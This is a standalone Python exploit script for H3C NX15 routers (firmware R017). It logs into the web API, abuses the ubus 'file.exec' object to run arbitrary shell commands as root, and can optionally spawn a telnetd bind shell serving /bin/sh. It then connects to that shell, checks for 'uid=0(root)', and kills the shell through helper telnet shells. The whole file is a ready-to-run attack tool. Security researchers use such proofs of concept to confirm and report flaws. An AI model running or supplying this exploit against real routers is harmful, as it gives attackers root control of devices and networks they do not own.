#!/usr/bin/env python3
import argparse
import base64
import json
import socket
import sys
import time
from typing import Any

import requests


def log(msg: str) -> None:
    print(msg, flush=True)


def login(base: str, username: str, password: str) -> str:
    r = requests.post(
        base.rstrip('/') + '/api/login/auth',
        json={'username': username, 'password': password},
        timeout=10,
    )
    r.raise_for_status()
    j = r.json()
    if j.get('code') != 0:
        raise RuntimeError(f'login failed: {j}')
    return j['data']['session']


def esps(base: str, session: str, obj: str, method: str, param: dict[str, Any], timeout: int = 20):
    headers = {'AUTHENTICATION': session, 'Content-Type': 'application/json'}
    payload = [{'id': 1, 'object': obj, 'method': method, 'param': param}]
    r = requests.post(base.rstrip('/') + '/api/esps', headers=headers, data=json.dumps(payload), timeout=timeout)
    r.raise_for_status()
    try:
        return r.json()
    except Exception:
        return r.text


def result_of(resp: Any) -> dict[str, Any]:
    if isinstance(resp, list) and resp and isinstance(resp[0], dict):
        return resp[0].get('result', {})
    if isinstance(resp, dict):
        return resp.get('result', {})
    return {}


def connect_shell(host: str, port: int, timeout: float = 5.0):
    s = socket.socket()
    s.settimeout(timeout)
    s.connect((host, port))
    time.sleep(0.3)
    banner = b''
    try:
        banner += s.recv(4096)
    except Exception:
        pass
    return s, banner


def run_shell_cmd(sock: socket.socket, cmd: str, end_marker: str = '__END__') -> str:
    sock.sendall(f'{cmd}; echo {end_marker}\n'.encode())
    time.sleep(0.7)
    data = b''
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            if end_marker.encode() in data or len(data) > 65535:
                break
    except Exception:
        pass
    return data.decode('latin1', 'ignore')


def cleanup_helper_shell(host: str, target_port: int) -> None:
    helper = None
    for p in (2323, 2330):
        try:
            helper, _ = connect_shell(host, p, timeout=3.0)
            break
        except Exception:
            continue
    if helper is None:
        log('[!] cleanup skipped: no helper shell on 2323/2330')
        return
    awk_pat = f'/telnetd -p{target_port}/ && !/awk/ {{print $1}}'
    out = run_shell_cmd(helper, f'pid=$(ps w | awk \'{awk_pat}\'); [ -n "$pid" ] && kill "$pid"; echo cleaned')
    log('[*] cleanup helper output:')
    print(out)
    helper.close()


def main() -> int:
    ap = argparse.ArgumentParser(description='H3C NX15 R017 post-auth root RCE via raw ubus object file.exec')
    ap.add_argument('--base', default='http://192.168.8.1', help='router base URL')
    ap.add_argument('--username', default='admin', help='web admin username')
    ap.add_argument('--password', default='admin123', help='web admin password')
    ap.add_argument('--host', default='192.168.8.1', help='target host')
    ap.add_argument('--cmd', default='id; uname -a; echo FILE_EXEC_OK >/tmp/file_exec_marker', help='shell command to execute through /bin/sh -c')
    ap.add_argument('--spawn-shell', action='store_true', help='also spawn a telnetd shell')
    ap.add_argument('--port', type=int, default=2350, help='temporary telnetd port when --spawn-shell is used')
    ap.add_argument('--cleanup', action='store_true', help='kill spawned telnetd after verification (uses helper shell on 2323/2330)')
    args = ap.parse_args()

    command = args.cmd
    if args.spawn_shell:
        command = f'{command}; telnetd -p{args.port} -l /bin/sh'

    log('[*] Step 1: login')
    session = login(args.base, args.username, args.password)
    log(f'[*] session = {session}')

    log('[*] Step 2: invoke raw ubus object file.exec as root')
    resp = esps(
        args.base,
        session,
        'file',
        'exec',
        {
            'command': '/bin/sh',
            'params': ['-c', command],
            'env': {},
        },
    )
    log('[*] file.exec response:')
    print(json.dumps(resp, ensure_ascii=False, indent=2) if not isinstance(resp, str) else resp)

    result = result_of(resp)
    stdout = result.get('stdout', '')
    code = result.get('code', None)
    ok = (code == 0) and ('uid=0(root)' in stdout)

    if args.spawn_shell:
        log(f'[*] Step 3: connect spawned shell on {args.host}:{args.port}')
        sock, banner = connect_shell(args.host, args.port)
        print(banner.decode('latin1', 'ignore'))
        proof = run_shell_cmd(sock, 'id; uname -a; cat /tmp/file_exec_marker 2>/dev/null')
        print(proof)
        ok = (code in (0, None)) and ('uid=0(root)' in proof)
        sock.close()
        if args.cleanup:
            cleanup_helper_shell(args.host, args.port)

    if ok:
        log('[+] SUCCESS: obtained root code execution via raw ubus file.exec')
        return 0

    log('[-] FAILED: expected root proof was not observed')
    return 1


if __name__ == '__main__':
    sys.exit(main())
